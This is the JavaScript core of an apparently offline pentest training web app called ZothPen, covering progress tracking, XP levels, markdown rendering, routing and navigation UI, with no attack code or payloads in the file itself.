/* ==========================================================================
   ZothPen — app core
   Everything here is offline. No network, no telemetry, no build step.
   Load order (index.html): data-*.js  ->  app.js  ->  views-*.js  ->  start.js

   Globals consumed:
     ZM modules · ZT tool dossiers · ZL labs · ZD drills · ZX console index · ZF forge
   ========================================================================== */
(function () {
'use strict';

/* ------------------------------------------------------------------ *
 * 0. tiny utilities
 * ------------------------------------------------------------------ */
const $  = (s, r) => (r || document).querySelector(s);
const $$ = (s, r) => Array.from((r || document).querySelectorAll(s));
const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
const attr = (s) => esc(s).replace(/\n/g, '&#10;');
const clamp = (v, a, b) => Math.max(a, Math.min(b, v));
const pad = (s, n) => String(s).padEnd(n, ' ');
const slug = (s) => String(s).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');

const ZO = window.ZO = { views: {}, snippets: [], base: [] };

/* ------------------------------------------------------------------ *
 * 1. state + storage  (progress is the only thing that persists)
 * ------------------------------------------------------------------ */
const KEY = 'zothpen.progress.v1';

const blankState = () => ({
  v: 1,
  lessons: {},   // 'm00:0' -> 1
  mods:    {},   // 'm00' -> 1
  labs:    {},   // 'lab-setup' -> 1
  drills:  {},   // 'd0-1' -> { r: times right, w: times wrong }
  forge:   {},   // 'f-alias' -> 1
  story:   {},   // 'm1' -> 1
  storyChoices: {}, // 'm1' -> 'stealth'
  seen:    {},   // 'mod:m00' / 'tool:t-nmap' -> 1
  days:    [],   // ISO dates of training days
  acted:   0,    // total graded actions
  tweaks:  { phosphor: 'green', font: 'pixel', scan: true, bloom: true, motion: true, audio: true, canvas: true, size: 14 },
  route:   '#/home',
  tl:      []    // timeline of milestones, newest first, max 40
});

let S = blankState();

function load() {
  try {
    const raw = localStorage.getItem(KEY);
    if (raw) {
      const p = JSON.parse(raw);
      S = Object.assign(blankState(), p);
      S.tweaks = Object.assign(blankState().tweaks, p.tweaks || {});
    }
  } catch (e) { S = blankState(); }
}
let saveTimer = null;
function save(now) {
  const write = () => { try { localStorage.setItem(KEY, JSON.stringify(S)); } catch (e) {} };
  if (now) { write(); return; }
  clearTimeout(saveTimer); saveTimer = setTimeout(write, 250);
}

/* data indexes ------------------------------------------------------ */
const ZM = window.ZM || [], ZT = window.ZT || [], ZL = window.ZL || [],
      ZD = window.ZD || [], ZX = window.ZX || [], ZF = window.ZF || [];
const byId = (arr) => { const m = {}; arr.forEach(o => { m[o.id] = o; }); return m; };
const M = byId(ZM), T = byId(ZT), L = byId(ZL), D = byId(ZD), R = byId(ZF);
ZO.M = M; ZO.T = T; ZO.L = L; ZO.D = D; ZO.R = R; ZO.ZM = ZM; ZO.ZT = ZT; ZO.ZL = ZL; ZO.ZD = ZD; ZO.ZX = ZX; ZO.ZF = ZF;

/* tool lookup that tolerates the console index naming things the
   dossier set does not (aliases, doc-only entries) — never crash on a
   dangling reference, show it as unresolved instead. */
const toolOf = (id) => T[id] || null;
const modOf  = (id) => M[id] || null;

/* ------------------------------------------------------------------ *
 * 2. xp, levels, streak — xp is DERIVED so re-marking can never double count
 * ------------------------------------------------------------------ */
const LEVELS = [
  [0,     'script kiddie'],
  [140,   'port gremlin'],
  [380,   'recon operative'],
  [760,   'exploit technician'],
  [1300,  'privilege escalator'],
  [2000,  'domain operator'],
  [2950,  'red teamer'],
  [4200,  'adversary emulator'],
  [5800,  'zero-day architect'],
  [7800,  'ZOTHPEN']
];
const DRILL_XP = 15;

function xpOf() {
  let xp = 0;
  ZM.forEach(m => {
    const per = Math.round(m.xp / Math.max(1, m.lessons.length));
    m.lessons.forEach((_, i) => { if (S.lessons[m.id + ':' + i]) xp += per; });
    if (S.mods[m.id]) xp += 20;
  });
  ZL.forEach(l => { if (S.labs[l.id]) xp += l.xp; });
  Object.keys(S.drills).forEach(k => { if (S.drills[k].r) xp += DRILL_XP; });
  ZF.forEach(r => { if (S.forge[r.id]) xp += 25; });
  if (S.story) {
    Object.keys(S.story).forEach(k => { if (S.story[k]) xp += (k === 'm8' ? 500 : 100); });
  }
  return xp;
}
function levelOf(xp) {
  let i = 0; for (let k = 0; k < LEVELS.length; k++) if (xp >= LEVELS[k][0]) i = k;
  const cur = LEVELS[i], next = LEVELS[i + 1] || null;
  return {
    n: i + 1, name: cur[1], floor: cur[0],
    ceil: next ? next[0] : cur[0],
    into: xp - cur[0],
    need: next ? next[0] - cur[0] : 0,
    pct: next ? clamp(((xp - cur[0]) / (next[0] - cur[0])) * 100, 0, 100) : 100,
    nextName: next ? next[1] : '—'
  };
}
const todayISO = () => new Date().toISOString().slice(0, 10);
function touchDay() {
  const d = todayISO();
  if (!S.days.includes(d)) { S.days.push(d); S.days.sort(); if (S.days.length > 400) S.days = S.days.slice(-400); save(); }
}
function streak() {
  if (!S.days.length) return 0;
  const set = new Set(S.days);
  let n = 0; const d = new Date();
  for (;;) {
    const iso = d.toISOString().slice(0, 10);
    if (set.has(iso)) { n++; d.setDate(d.getDate() - 1); }
    else if (n === 0) { d.setDate(d.getDate() - 1); if (n === 0 && !set.has(d.toISOString().slice(0,10))) return 0; }
    else break;
  }
  return n;
}
function award(kind, label) {           // milestone timeline entry
  S.tl.unshift({ k: kind, t: label, d: Date.now() });
  S.tl = S.tl.slice(0, 40);
  touchDay(); save();
}
function stats() {
  const xp = xpOf(), lv = levelOf(xp);
  const lessonsTotal = ZM.reduce((n, m) => n + m.lessons.length, 0);
  const lessonsDone = Object.keys(S.lessons).length;
  const modsDone = Object.keys(S.mods).length;
  const labsDone = Object.keys(S.labs).length;
  let dr = 0, dw = 0;
  Object.values(S.drills).forEach(o => { dr += o.r || 0; dw += o.w || 0; });
  const forgeDone = Object.keys(S.forge).length;
  const answered = dr + dw;
  return {
    xp, lv, lessonsTotal, lessonsDone, modsDone, labsDone,
    drillsRight: dr, drillsWrong: dw, answered,
    acc: answered ? Math.round((dr / answered) * 100) : 0,
    forgeDone, streak: streak(),
    pct: Math.round((xp / LEVELS[LEVELS.length - 1][0]) * 100)
  };
}

/* ------------------------------------------------------------------ *
 * 3. markdown -> html  (grammar defined in the header of data-modules.js)
 *      ```lang fence · # heading · - bullet · 1. ordered · | table
 *      > note · >! danger · >= info · >+ ok · **bold** · `code` · [t](u)
 * ------------------------------------------------------------------ */
const KW = 'if|then|else|elif|fi|for|while|until|do|done|case|esac|function|return|local|export|declare|readonly|source|sudo|echo|printf|cat|grep|sed|awk|curl|wget|set|trap|import|from|as|def|class|with|try|except|finally|raise|lambda|yield|assert|global|nonlocal|pass|in|not|and|or|is|None|True|False|self|print|new|var|let|const|foreach|param|begin|process|end|nil|end|require|module|select|where|insert|update|delete';
const RX_TOKEN = new RegExp(
  '(#[^\\n]*)' +                                   // 1 comment
  '|("(?:[^"\\\\]|\\\\.)*"|\'(?:[^\'\\\\]|\\\\.)*\')' + // 2 string
  '|(\\$[A-Za-z_][A-Za-z0-9_]*|\\$\\{[^}]*\\}|%[A-Za-z_]+%)' + // 3 variable
  '|\\b(' + KW + ')\\b' +                          // 4 keyword
  '|(^|\\s)(--?[A-Za-z][A-Za-z0-9-]*)' +           // 5/6 flag
  '|\\b(0x[0-9a-fA-F]+|\\d+(?:\\.\\d+)?)\\b',      // 7 number
  'g');

function highlight(code, lang) {
  const L = String(lang || '').toLowerCase();
  const prose = (L === 'text' || L === 'ascii' || L === 'markdown' || L === '');
  const out = [];
  String(code).split('\n').forEach((line) => {
    if (prose) { out.push(esc(line)); return; }
    const parts = [];
    let last = 0, m;
    RX_TOKEN.lastIndex = 0;
    while ((m = RX_TOKEN.exec(line))) {
      if (m.index > last) parts.push(esc(line.slice(last, m.index)));
      if (m[1] != null) parts.push('<span class="c-com">' + esc(m[1]) + '</span>');
      else if (m[2] != null) parts.push('<span class="c-str">' + esc(m[2]) + '</span>');
      else if (m[3] != null) parts.push('<span class="c-var">' + esc(m[3]) + '</span>');
      else if (m[4] != null) parts.push('<span class="c-kw">' + esc(m[4]) + '</span>');
      else if (m[6] != null) {
        if (m[5]) parts.push(esc(m[5]));
        parts.push('<span class="c-flag">' + esc(m[6]) + '</span>');
      } else if (m[7] != null) parts.push('<span class="c-num">' + esc(m[7]) + '</span>');
      last = m.index + m[0].length;
    }
    if (last < line.length) parts.push(esc(line.slice(last)));
    out.push(parts.join(''));
  });
  return out.join('\n');
}

function inline(src) {
  let s = esc(src);
  s = s.replace(/`([^`]+)`/g, "<code>$1</code>");
  s = s.replace(/\*\*\*([^\*\n]+?)\*\*\*/g, "<b><em>$1</em></b>");
  s = s.replace(/\*\*([^\*\n]+?)\*([^\*\n]+?)\*\*\*/g, "<b>$1<em>$2</em></b>");
  s = s.replace(/\*\*([^\*\n]+?)\*\*/g, "<b>$1</b>");
  s = s.replace(/\*([^\*\n]+?)\*/g, "<em>$1</em>");
  s = s.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, (all, t, u) =>
    /^(https?:|mailto:|#|\/)/i.test(u) ? "<a href=\"" + u + "\" target=\"_blank\" rel=\"noopener noreferrer\">" + t + "</a>" : all);
  return s;
}

function md(src) {
  if (!src) return '';
  const lines = String(src).replace(/\r/g, '').split('\n');
  const out = [];
  let list = null, code = null, cl = [], para = [], tbl = null;

  const closeList = () => { if (list) { out.push('</' + list + '>'); list = null; } };
  const closeTbl  = () => { if (tbl) { out.push(tbl.join('') + '</table>'); tbl = null; } };
  const flushPara = () => { if (para.length) { out.push('<p>' + inline(para.join(' ')) + '</p>'); para = []; } };
  const flush = () => { flushPara(); closeList(); closeTbl(); };

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const fence = line.match(/^\s*```+\s*([A-Za-z0-9+-]*)\s*$/);
    if (code !== null) {
      if (fence) {
        out.push(codeBlock(cl.join('\n'), code));
        code = null; cl = [];
      } else cl.push(line);
      continue;
    }
    if (fence) { flush(); code = fence[1] || ''; continue; }

    if (!line.trim()) { flush(); continue; }

    let m;
    if ((m = line.match(/^\s*(#{1,4})\s+(.*)$/))) { flush(); out.push('<h3 class="h3">' + inline(m[2]) + '</h3>'); continue; }

    // callouts
    if ((m = line.match(/^\s*>\s*([!+=])?\s?(.*)$/))) {
      flush(); const kind = m[1], body = m[2];
      const rest = [body];
      while (i + 1 < lines.length) {
        const nx = lines[i + 1].match(/^\s*>\s*([!+=])?\s?(.*)$/);
        if (!nx) break;
        i++; rest.push(nx[2]);
      }
      const cls = kind === '!' ? 'danger' : kind === '=' ? 'info' : kind === '+' ? 'ok' : '';
      const lab = kind === '!' ? 'DANGER' : kind === '=' ? 'NOTE' : kind === '+' ? 'DONE' : 'ASIDE';
      out.push('<div class="note ' + cls + '"><span class="lab">' + lab + '</span>' + md(rest.join('\n')) + '</div>');
      continue;
    }

    // table
    if (/^\s*\|/.test(line)) {
      flushPara();
      const cells = (l) => l.trim().replace(/^\||\|$/g, '').split('|').map(c => c.trim());
      if (!tbl) tbl = ['<table>'];
      const isSep = /^\s*\|[\s:|-]+\|\s*$/.test(line);
      if (isSep) continue;
      const inHead = tbl.length === 1;
      tbl.push('<tr>' + cells(line).map(c => (inHead ? '<th>' : '<td>') + inline(c) + (inHead ? '</th>' : '</td>')).join('') + '</tr>');
      if (i + 1 >= lines.length || !/^\s*\|/.test(lines[i + 1])) { closeTbl(); }
      continue;
    }
    closeTbl();

    if ((m = line.match(/^\s*([-*+])\s+(.*)$/))) {
      flushPara();
      if (list !== 'ul') { closeList(); out.push('<ul>'); list = 'ul'; }
      out.push('<li>' + inline(m[2]) + '</li>');
      continue;
    }
    if ((m = line.match(/^\s*(\d+)[.)]\s+(.*)$/))) {
      flushPara();
      if (list !== 'ol') { closeList(); out.push('<ol>'); list = 'ol'; }
      out.push('<li>' + inline(m[2]) + '</li>');
      continue;
    }
    if (/^\s*(-{3,}|\*{3,})\s*$/.test(line)) { flush(); out.push('<hr>'); continue; }
    closeList();
    para.push(line.trim());
  }
  if (code !== null) out.push(codeBlock(cl.join('\n'), code));
  flush();
  return out.join('\n');
}

/* ------------------------------------------------------------------ *
 * 4. reusable components
 * ------------------------------------------------------------------ */
function codeBlock(code, lang, title) {
  const i = ZO.snippets.push(String(code)) - 1;
  return '<div class="code">' +
    '<div class="code-head"><span>' + esc(title || lang || 'code') + '</span><span class="sp"></span>' +
    '<button class="copy" data-act="copy" data-i="' + i + '" title="copy to clipboard">copy</button></div>' +
    '<div class="code-body">' + highlight(code, lang) + '</div></div>';
}
function note(kind, body, label) {
  const cls = kind === 'danger' ? 'danger' : kind === 'info' ? 'info' : kind === 'ok' ? 'ok' : '';
  const lab = label || (kind === 'danger' ? 'DANGER' : kind === 'info' ? 'NOTE' : kind === 'ok' ? 'DONE' : 'ASIDE');
  return '<div class="note ' + cls + '"><span class="lab">' + esc(lab) + '</span>' + body + '</div>';
}
const diffTag = (d) => {
  const k = (d || '').toLowerCase();
  const cls = k.indexOf('hard') === 0 ? 'hard' : k.indexOf('med') === 0 ? 'med' : k.indexOf('easy') === 0 ? 'easy' : '';
  return '<span class="tag ' + cls + '">' + esc(d) + '</span>';
};
const kindTag = (k) => '<span class="tag os">' + esc(k) + '</span>';
const chip = (label, act, id, title) => {
  let extra = '';
  if (id) extra = act === 'go' ? ' data-hash="' + attr(id) + '"' : ' data-id="' + attr(id) + '"';
  return '<button class="chip" style="cursor:pointer" data-act="' + attr(act) + '"' + extra +
    (title ? ' title="' + attr(title) + '"' : '') + '>' + esc(label) + '</button>';
};
const bar = (pct, w) => {
  const n = w || 24, f = Math.round((clamp(pct, 0, 100) / 100) * n);
  return '<span class="pbar">[' + '█'.repeat(f) + '<span class="dim">' + '░'.repeat(n - f) + '</span>]</span>';
};
const meter = (pct, n) => {
  const k = n || 10, f = Math.round((clamp(pct, 0, 100) / 100) * k);
  let s = '<span class="meter">';
  for (let i = 0; i < k; i++) s += '<i class="' + (i < f ? 'f' : '') + '"></i>';
  return s + '</span>';
};
const crumbs = (parts) => '<div class="crumbs">' + parts.map(p =>
  p.go ? '<a href="#' + p.go + '">' + esc(p.t) + '</a>' : '<b>' + esc(p.t) + '</b>').join(' <span class="sep">›</span> ') + '</div>';
const rule = (label) => '<div class="rule">─── <b>' + esc(label) + '</b> ' + '─'.repeat(Math.max(4, 74 - label.length)) + '</div>';
const empty = (msg) => '<div class="empty">' + esc(msg) + '</div>';

/* ------------------------------------------------------------------ *
 * 5. routing
 * ------------------------------------------------------------------ */
const DOMAIN = { mod: 'mod', tool: 'tool', lab: 'lab', forge: 'forge', story: 'story' };

function parseHash() {
  const h = (location.hash || '#/home').replace(/^#\/?/, '');
  const p = h.split('/').filter(Boolean);
  return { name: p[0] || 'home', id: p[1] || '', tab: p[2] || '' };
}
function go(hash) { location.hash = hash; }
/* a route name with an id sometimes means a different view: #/forge/<id> is the
   recipe reader, #/forge alone is the recipes index. */
function viewNameFor(r) {
  if (r.id && (r.name === 'forge')) return 'recipe';
  return r.name;
}
function render() {
  const r = parseHash();
  const view = ZO.views[viewNameFor(r)];
  const el = $('#view');
  if (!el) return;
  ZO.snippets = [];
  const out = view ? view(r) : ZO.views.notfound(r);
  el.innerHTML = typeof out === 'string' ? out : (out && out.html) || '';

  // Non-negotiable: each time user goes to new page, scroll position starts at top of page
  const resetScrollTop = () => {
    const main = $('#main');
    if (main) main.scrollTop = 0;
    if (el) el.scrollTop = 0;
    window.scrollTo(0, 0);
    document.documentElement.scrollTop = 0;
    document.body.scrollTop = 0;
  };
  resetScrollTop();

  if (out && out.after) setTimeout(() => {
    out.after();
    resetScrollTop();
  }, 0);

  markSeen(r);
  sidebar();
  rail(r);
  statusbar(r);
  topbar();
  resetScrollTop();
  requestAnimationFrame(resetScrollTop);
  setTimeout(resetScrollTop, 50);

  const cb = ZO.afterRender; if (cb) cb(r);
  if (window.ZOMatrixText) window.ZOMatrixText.autoEnhance();
}
function markSeen(r) {
  const d = DOMAIN[r.name];
  if (d && r.id && !S.seen[d + ':' + r.id]) { S.seen[d + ':' + r.id] = 1; save(); }
}
window.addEventListener('hashchange', render);

/* ------------------------------------------------------------------ *
 * 6. sidebar
 * ------------------------------------------------------------------ */
const NAV = [
  { group: 'LEARN', items: [{ k: 'home', ico: '▚', t: 'Overview' }] },
  { group: 'CAMPAIGN', items: [{ k: 'story', ico: '☿', t: 'Sovereign Protocol' }] },
  { group: 'PRACTICE', items: [
    { k: 'labs', ico: '⌬', t: 'Hands-on labs' },
    { k: 'drills', ico: '?', t: 'Drill range' }] },
  { group: 'ARSENAL', items: [
    { k: 'tools', ico: '⚒', t: 'Tool dossiers' },
    { k: 'console', ico: '>', t: 'Console' }] },
  { group: 'FORGE', items: [{ k: 'forge', ico: '⌗', t: 'Script the tools' }] },
  { group: 'YOU', items: [{ k: 'progress', ico: '◱', t: 'Dossier & progress' }] }
];

function sidebar() {
  const cur = parseHash();
  let h = '';

  NAV.forEach((sec, si) => {
    h += '<div class="navgroup">' + sec.group + '</div>';
    sec.items.forEach((it) => {
      const cnt = countFor(it.k);
      h += '<button class="navitem ' + (cur.name === it.k ? 'on' : '') + '" data-act="go" data-hash="#/' + it.k + '">' +
           '<span class="ico">' + it.ico + '</span><span>' + esc(it.t) + '</span>' +
           (cnt ? '<span class="cnt">' + cnt + '</span>' : '') + '</button>';
      if (si === 0 && it.k === 'home') {
        h += '<div class="navgroup">CURRICULUM</div>';
        ZM.forEach((m) => {
          const done = m.lessons.filter((_, i) => S.lessons[m.id + ':' + i]).length;
          const all = done === m.lessons.length && m.lessons.length > 0;
          const open = cur.name === 'mod' && cur.id === m.id;
          h += '<button class="navitem moditem ' + (all ? 'done' : '') + ' ' + (open ? 'on' : '') + '" data-act="go" data-hash="#/mod/' + m.id + '">' +
               '<span class="modrow"><span class="bar">' + barRatio(done, m.lessons.length) + '</span>' +
               '<span class="n">' + m.n + '</span><span>' + esc(m.title) + '</span></span>' +
               '<span class="modrow muted" style="font-size:.82em">' + esc(m.phase) + ' · ' + done + '/' + m.lessons.length + ' lessons' + (S.mods[m.id] ? ' · complete' : '') + '</span>' +
               '</button>';
        });
      }
    });
  });
  const el = $('#sidebarInner'); if (el) el.innerHTML = h;
}
const barRatio = (d, t) => '[' + '▰'.repeat(t ? Math.round((d / t) * 5) : 0).padEnd(5, '▱') + ']';
function countFor(k) {
  switch (k) {
    case 'story': {
      const s = S.story || {};
      return Object.keys(s).filter(id => s[id]).length + '/8';
    }
    case 'labs': return Object.keys(S.labs).length + '/' + ZL.length;
    case 'drills': return Object.keys(S.drills).length + '/' + ZD.length;
    case 'tools': return ZT.length;
    case 'forge': return Object.keys(S.forge).length + '/' + ZF.length;
    default: return '';
  }
}

/* ------------------------------------------------------------------ *
 * 7. rail (right column) — contextual
 * ------------------------------------------------------------------ */
function rail(r) {
  const el = $('#railInner'); if (!el) return;
  const st = stats();
  const v = ZO.views[parseHash().name];
  const custom = ZO.railFor && ZO.railFor(r, st);
  let h = '';

  h += '<div class="blk"><h4>OPERATOR</h4>' +
       kv('level', st.lv.n + ' · ' + st.lv.name) +
       kv('xp', st.xp) +
       kv('progress', st.pct + '%') +
       kv('streak', st.streak + 'd') +
       kv('drill acc', st.acc + '%') +
       '</div>';

  if (custom) h += custom;

  const nx = nextUp();
  if (nx) {
    h += '<div class="blk"><h4>NEXT UP</h4><div class="next"><b>' + esc(nx.t) + '</b>' +
         '<span class="muted small">' + esc(nx.d) + '</span><br>' +
         '<button class="btn" data-act="go" data-hash="' + nx.h + '">open →</button></div></div>';
  }

  h += '<div class="blk"><h4>PHASES</h4>';
  const phases = [...new Set(ZM.map(m => m.phase))];
  phases.forEach((p) => {
    const ms = ZM.filter(m => m.phase === p);
    const tot = ms.reduce((n, m) => n + m.lessons.length, 0);
    const dn = ms.reduce((n, m) => n + m.lessons.filter((_, i) => S.lessons[m.id + ':' + i]).length, 0);
    const pct = tot ? Math.round((dn / tot) * 100) : 0;
    h += '<div class="kv"><span>' + esc(p.toLowerCase()) + '</span><span>' + meter(pct) + ' ' + pct + '%</span></div>';
  });
  h += '</div>';

  const tl = S.tl.slice(0, 6);
  h += '<div class="blk"><h4>LOG</h4>' + (tl.length
    ? tl.map(e => '<div class="kv"><span class="muted">' + esc(new Date(e.d).toLocaleDateString(undefined, { month: 'short', day: 'numeric' })) + '</span><span>' + esc(e.t) + '</span></div>').join('')
    : '<div class="muted small">Nothing logged yet. Mark a lesson done and it lands here.</div>') + '</div>';

  h += '<div class="blk"><h4>AUTHORISATION</h4><div class="muted small">Every lab in here targets something you own or are contracted to test. Written, scoped, signed, dated — or you are the one breaking the law.</div>' +
       '<button class="btn" data-act="go" data-hash="#/mod/m00">rules of engagement</button></div>';

  el.innerHTML = h;
}
const kv = (k, v) => '<div class="kv"><span>' + esc(k) + '</span><span>' + esc(v) + '</span></div>';

function nextUp() {
  for (const m of ZM) {
    const i = m.lessons.findIndex((_, k) => !S.lessons[m.id + ':' + k]);
    if (i >= 0) return { t: m.n + ' · ' + m.lessons[i].t, d: m.title + ' — lesson ' + (i + 1) + ' of ' + m.lessons.length, h: '#/mod/' + m.id };
  }
  const l = ZL.find(x => !S.labs[x.id]);
  if (l) return { t: l.title, d: 'hands-on lab · ' + l.diff + ' · ' + l.time, h: '#/lab/' + l.id };
  const f = ZF.find(x => !S.forge[x.id]);
  if (f) return { t: f.title, d: 'forge recipe · ' + f.lang + ' · ' + f.time, h: '#/forge/' + f.id };
  const d = ZD.find(x => !S.drills[x.id]);
  if (d) return { t: 'Drill: ' + d.q.slice(0, 46) + '…', d: 'testing what you have read', h: '#/drills' };
  return { t: 'You are through the manual', d: 'Rebuild a lab from scratch, drill weak modules, or start the Forge recipes over with your own tooling.', h: '#/progress' };
}

/* ------------------------------------------------------------------ *
 * 8. statusbar
 * ------------------------------------------------------------------ */
const KEYS = [
  ['⌘K', 'search'], ['g h', 'home'], ['g m', 'map'], ['g l', 'labs'],
  ['g d', 'drills'], ['g t', 'tools'], ['g c', 'console'], ['g f', 'forge'],
  ['[ ]', 'prev/next module'], ['?', 'keys']
];
function statusbar() {
  const el = $('#statuskeys'); if (el) el.innerHTML = KEYS.map(k => '<span><b>' + esc(k[0]) + '</b> ' + esc(k[1]) + '</span>').join('');
}
/* ---- topbar live values ---- */
function topbar() {
  const st = stats();
  const lv = $('#xpLabel'), xf = $('#xpFill'), xv = $('#xpVal'), sc = $('#streakChip');
  if (lv) lv.textContent = 'lvl ' + st.lv.n + ' · ' + st.lv.name;
  if (xf) xf.style.width = st.lv.pct + '%';
  if (xv) xv.textContent = st.lv.need ? st.lv.into + '/' + st.lv.need + ' xp' : 'maxed';
  if (sc) sc.textContent = 'streak ' + st.streak + 'd';
  document.title = 'ZothPen // ' + (st.xp ? st.lv.name + ' · ' + st.xp + 'xp' : 'offensive security field manual — free pentest course');

  const bm = $('#brandMark');
  if (bm && !bm.dataset.wired) {
    bm.dataset.wired = 'true';
    if (window.ZOSigils && window.ZOSigils.brandMicro) {
      bm.innerHTML = window.ZOSigils.brandMicro(24);
    }
    bm.addEventListener('click', () => {
      const modes = ['green', 'amber', 'ice', 'magenta'];
      const cur = S.tweaks.phosphor || 'green';
      const next = modes[(modes.indexOf(cur) + 1) % modes.length];
      S.tweaks.phosphor = next;
      applyTweaks();
      save();
      say('Reality shifted: ' + next.toUpperCase() + ' PHOSPHOR', 'ok');
      if (window.ZOSynth && window.ZOSynth.playChime) window.ZOSynth.playChime();
    });
  }
}
ZO.topbar = topbar;

let msgTimer = null;
function say(text, cls) {
  const el = $('#statusMsg'); if (!el) return;
  el.textContent = text;
  el.style.color = cls === 'err' ? 'var(--red)' : cls === 'ok' ? 'var(--phos)' : 'var(--amber)';
  clearTimeout(msgTimer);
  msgTimer = setTimeout(() => { el.textContent = 'ready.'; el.style.color = 'var(--amber)'; }, 4200);
}
function toast(text, kind) {
  const box = $('#toasts'); if (!box) return;
  const t = document.createElement('div');
  t.className = 'toast ' + (kind || '');
  t.innerHTML = text;
  box.appendChild(t);
  setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity .3s'; }, 2200);
  setTimeout(() => t.remove(), 2600);
}

/* ------------------------------------------------------------------ *
 * 9. progress writers
 * ------------------------------------------------------------------ */
function checkLevelUp(oldLv) {
  const newLv = stats().lv.n;
  if (newLv > oldLv) {
    if (window.ZO_SOUND) ZO_SOUND.levelUp();
    toast('⭐ <b>LEVEL UP!</b> You are now <b>' + stats().lv.name + '</b> (Level ' + newLv + ')', 'ok');
  } else if (window.ZO_SOUND) {
    ZO_SOUND.xp();
  }
}

function toggleLesson(modId, i) {
  const k = modId + ':' + i;
  const m = M[modId]; if (!m) return;
  const oldLv = stats().lv.n;
  if (S.lessons[k]) { delete S.lessons[k]; say('lesson unmarked.'); if (window.ZO_SOUND) ZO_SOUND.tick(); }
  else {
    S.lessons[k] = 1; S.acted++;
    say('+' + Math.round(m.xp / m.lessons.length) + ' xp — ' + m.lessons[i].t, 'ok');
    if (window.ZO_BG_WARP) window.ZO_BG_WARP(1.8);
    const done = m.lessons.every((_, j) => S.lessons[modId + ':' + j]);
    if (done && !S.mods[modId]) {
      S.mods[modId] = 1;
      award('module', m.n + ' ' + m.title + ' complete');
      toast('<b>module complete</b> — ' + esc(m.title), '');
    } else touchDay();
    checkLevelUp(oldLv);
  }
  save(true); render();
}
function toggleLab(id) {
  const l = L[id]; if (!l) return;
  const oldLv = stats().lv.n;
  if (S.labs[id]) { delete S.labs[id]; say('lab unmarked.'); if (window.ZO_SOUND) ZO_SOUND.tick(); }
  else {
    S.labs[id] = 1; S.acted++;
    award('lab', l.title);
    if (window.ZO_BG_WARP) window.ZO_BG_WARP(2.2);
    say('+' + l.xp + ' xp — lab complete: ' + l.title, 'ok');
    toast('<b>lab complete</b> · +' + l.xp + ' xp', '');
    checkLevelUp(oldLv);
  }
  save(true); render();
}
function toggleForge(id) {
  const f = R[id]; if (!f) return;
  const oldLv = stats().lv.n;
  if (S.forge[id]) { delete S.forge[id]; say('recipe unmarked.'); if (window.ZO_SOUND) ZO_SOUND.tick(); }
  else {
    S.forge[id] = 1; S.acted++;
    award('forge', f.title);
    if (window.ZO_BG_WARP) window.ZO_BG_WARP(2.0);
    say('+25 xp — recipe studied: ' + f.title, 'ok');
    toast('<b>recipe studied</b> · +25 xp', '');
    checkLevelUp(oldLv);
  }
  save(true); render();
}
function recordDrill(id, right) {
  const o = S.drills[id] || { r: 0, w: 0 };
  const oldLv = stats().lv.n;
  if (right) {
    if (!o.r) { o.r = 1; award('drill', 'answered: ' + id); }
    if (window.ZO_SOUND) ZO_SOUND.right();
  } else {
    o.w = (o.w || 0) + 1;
    if (window.ZO_SOUND) ZO_SOUND.wrong();
  }
  S.drills[id] = o; S.acted++; save(true);
  if (right) checkLevelUp(oldLv);
}

/* ------------------------------------------------------------------ *
 * 10. palette
 * ------------------------------------------------------------------ */
let palItems = [], palSel = 0;
function buildPalette() {
  const items = [];
  const nav = [['home', 'Overview'], ['tools', 'Tool dossiers'], ['labs', 'Hands-on labs'],
    ['drills', 'Drill range'], ['console', 'Console'], ['forge', 'Forge'], ['progress', 'Dossier'],
    ['comic', 'Comic Chronicles (Downtime Lounge)']];
  nav.forEach(([k, t]) => items.push({ k: 'GO', t: t, d: '#/' + k, h: '#/' + k }));
  items.push({ k: 'CHRONICLES', t: 'Operator Downtime // Comic Chronicles', d: '3 Illustrated Issues · Season 01', h: '#/comic', s: 'comic manga bored downtime rest relax lore' });
  ZM.forEach(m => items.push({ k: 'MODULE', t: m.n + ' ' + m.title, d: m.phase, h: '#/mod/' + m.id, s: m.blurb }));
  ZM.forEach(m => m.lessons.forEach((l, i) => items.push({ k: 'LESSON', t: l.t, d: m.n + ' ' + m.title, h: '#/mod/' + m.id, s: m.id + ':' + i })));
  ZT.forEach(t => items.push({ k: 'TOOL', t: t.name, d: t.pkg + ' · ' + t.kind, h: '#/tool/' + t.id, s: t.tagline + ' ' + t.what }));
  ZL.forEach(l => items.push({ k: 'LAB', t: l.title, d: l.diff + ' · ' + l.time + ' · ' + l.os, h: '#/lab/' + l.id, s: l.goal }));
  ZD.forEach(d => items.push({ k: 'DRILL', t: d.q.replace(/\s+/g, ' '), d: (M[d.mod] ? M[d.mod].n + ' ' + M[d.mod].title : d.mod) + ' · ' + d.diff, h: '#/drills', s: (d.tags || []).join(' ') }));
  ZF.forEach(r => items.push({ k: 'FORGE', t: r.title, d: r.lang + ' · ' + r.lvl, h: '#/forge/' + r.id, s: r.why }));
  ZX.forEach(x => items.push({ k: 'CMD', t: x.c + (x.al && x.al.length ? ' (' + x.al.join(', ') + ')' : ''), d: x.cat + ' · ' + x.what.slice(0, 60), h: '#/console', s: 'run:' + x.c }));
  [['forge all', 'recipe list'], ['export', 'download progress json'], ['import', 'load progress json'],
   ['wipe', 'reset all progress'], ['keys', 'keyboard help'], ['tweaks', 'appearance']]
    .forEach(([c, d]) => items.push({ k: 'CMD', t: c, d: d, h: 'cmd:' + c }));
  return items;
}
function score(item, q) {
  const hay = (item.t + ' ' + item.d + ' ' + (item.s || '')).toLowerCase();
  const t = item.t.toLowerCase();
  if (!q) return 1;
  if (t.indexOf(q) === 0) return 100 - t.length * 0.01;
  if (t.indexOf(q) > -1) return 60 - t.length * 0.01;
  if (hay.indexOf(q) > -1) return 30;
  const parts = q.split(/\s+/).filter(Boolean);
  let n = 0; parts.forEach(p => { if (hay.indexOf(p) > -1) n++; });
  return n === parts.length && n ? 15 : 0;
}
function openPalette() {
  palItems = buildPalette();
  const ov = $('#palette'); ov.hidden = false;
  const inp = $('#paletteInput'); inp.value = ''; inp.focus();
  palSel = 0; drawPalette('');
}
